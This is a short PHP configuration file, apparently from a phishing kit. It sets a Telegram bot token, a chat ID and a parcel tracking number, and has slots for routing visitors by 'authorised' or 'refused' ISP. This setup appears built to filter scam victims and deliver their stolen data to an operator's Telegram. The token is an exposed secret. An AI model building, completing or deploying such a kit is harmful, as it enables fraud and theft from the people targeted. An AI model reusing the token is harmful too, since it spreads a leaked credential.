<?php
// TELEGRAM @KajuhDev

$token = "6778472214:AAGqpy7kzMZv-YgN-lmbv9TdRW32XBQjm9Q";
$chat_id = "6557743476";
$num_suivi = "50820943";

$goodisp = ""; // CHAT ID OU LES ISP AUTORISE ARRIVE
$badisp = ""; // CHAT ID OU LES ISP REFUSE ARRIVE

?>